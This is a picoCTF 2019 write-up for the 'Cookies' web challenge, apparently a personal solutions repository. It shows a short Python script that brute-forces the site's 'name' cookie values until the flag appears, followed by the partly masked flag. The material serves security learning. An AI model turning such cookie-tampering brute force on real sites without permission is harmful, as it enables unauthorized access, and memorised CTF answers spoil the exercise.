# Cookies

Tags: picoCTF 2019, Web Exploitation

| Author    | Point     |
| --------- | --------- |
| MADSTACKS | 40 points |

## Description

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/

## Solve

When we look at the web page, there is an input form.

![](https://github.com/Yunolay/picoctf_writeup/blob/main/Web%20Exploitation/Cookies/images/CleanShot%202024-04-15%20at%2018.11.37.png)

I tried entering the appropriate values.

![CleanShot 2024-04-15 at 18.20.28](./images/CleanShot 2024-04-15 at 18.20.28.png)

-1 was saved in cookie. Changing this to 1 made it a special cookie, but I didn't get the flag.

![CleanShot 2024-04-15 at 18.23.11](./images/CleanShot 2024-04-15 at 18.23.11.png)

![CleanShot 2024-04-15 at 18.23.43](./images/CleanShot 2024-04-15 at 18.23.43-3175267.png)

Since it is assumed that it is an index, I wrote a script that uses brute force.

```python
import requests

url = "http://mercury.picoctf.net:29649/check"

s = requests.Session()

for i in range(1000):
    cookies = {"name": f"{i}"}
    r = s.get(url, cookies=cookies)
    if "picoCTF" in r.text:
        print(r.text)
        break
```

As a result, I got a flag.

```
$ python3 solver.py

[snip]
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_********}</code></p>
        </div>
[snip]
```

## Flag

```
picoCTF{3v3ry1_l0v3s_c00k135_********}
```
